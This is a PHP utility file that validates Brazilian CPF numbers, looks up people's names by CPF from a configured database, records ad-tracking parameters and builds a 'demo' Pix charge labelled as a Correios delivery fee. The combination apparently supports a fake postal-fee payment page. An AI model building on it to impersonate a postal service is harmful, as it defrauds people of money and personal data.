<?php

declare(strict_types=1);

function app_config(): array
{
    static $config = null;
    if ($config === null) {
        $config = require dirname(__DIR__) . '/config.php';
    }
    return $config;
}

function json_response(array $payload, int $status = 200): void
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

function read_json_body(): array
{
    $raw = file_get_contents('php://input');
    if (!$raw) {
        return [];
    }
    $decoded = json_decode($raw, true);
    return is_array($decoded) ? $decoded : [];
}

function normalize_cpf(string $cpf): string
{
    return preg_replace('/\D/', '', $cpf) ?? '';
}

function format_cpf(string $cpf): string
{
    $digits = normalize_cpf($cpf);
    if (strlen($digits) !== 11) {
        return $cpf;
    }
    return preg_replace('/^(\d{3})(\d{3})(\d{3})(\d{2})$/', '$1.$2.$3-$4', $digits) ?? $digits;
}

function is_valid_cpf(string $cpf): bool
{
    $digits = normalize_cpf($cpf);
    if (strlen($digits) !== 11 || preg_match('/^(\d)\1{10}$/', $digits)) {
        return false;
    }

    for ($t = 9; $t < 11; $t++) {
        $sum = 0;
        for ($i = 0; $i < $t; $i++) {
            $sum += (int) $digits[$i] * (($t + 1) - $i);
        }
        $check = ((10 * $sum) % 11) % 10;
        if ((int) $digits[$t] !== $check) {
            return false;
        }
    }

    return true;
}

function sanitize_name(string $name): string
{
    $name = trim(preg_replace('/\s+/', ' ', $name) ?? '');
    $name = preg_replace('/[^a-zA-ZÀ-ÿ\s]/u', '', $name) ?? '';
    return $name;
}

function capture_tracking_params(): array
{
    $keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'campaign', 'fbclid', 'gclid', 'click_id'];
    $tracking = [];
    foreach ($keys as $key) {
        if (!empty($_GET[$key])) {
            $tracking[$key] = (string) $_GET[$key];
        }
    }
    return $tracking;
}

function build_query(array $params): string
{
    $filtered = array_filter($params, static fn($value) => $value !== null && $value !== '');
    return $filtered ? ('?' . http_build_query($filtered)) : '';
}

function data_dir(): string
{
    $dir = dirname(__DIR__) . '/data';
    if (!is_dir($dir)) {
        mkdir($dir, 0775, true);
    }
    return $dir;
}

function load_json_file(string $filename): array
{
    $path = data_dir() . '/' . $filename;
    if (!is_file($path)) {
        return [];
    }
    $decoded = json_decode((string) file_get_contents($path), true);
    return is_array($decoded) ? $decoded : [];
}

function save_json_file(string $filename, array $data): void
{
    file_put_contents(data_dir() . '/' . $filename, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function lookup_cpf_name(string $cpf): ?string
{
    $digits = normalize_cpf($cpf);
    $database = app_config()['cpf_database'] ?? [];
    return $database[$digits] ?? null;
}

function get_customer_from_session(): array
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    return $_SESSION['customer'] ?? [];
}

function save_customer_to_session(array $customer): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    $_SESSION['customer'] = array_merge($_SESSION['customer'] ?? [], $customer);
}

function format_date_br(string $modifier = 'today'): string
{
    return (new DateTimeImmutable($modifier))->format('d/m/Y');
}

function generate_demo_br_code(float $amount, string $chargeId): string
{
    $value = number_format($amount, 2, '.', '');
    return '00020126580014BR.GOV.BCB.PIX0136demo-' . $chargeId . '520400005303986540' . strlen($value) . $value . '5802BR5925TAXA ENTREGA CORREIOS6009CURITIBA62070503***6304DEMO';
}

function generate_qr_data_uri(string $payload): string
{
    $url = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' . rawurlencode($payload);
    $image = @file_get_contents($url);
    if ($image === false) {
        return '';
    }
    return 'data:image/png;base64,' . base64_encode($image);
}
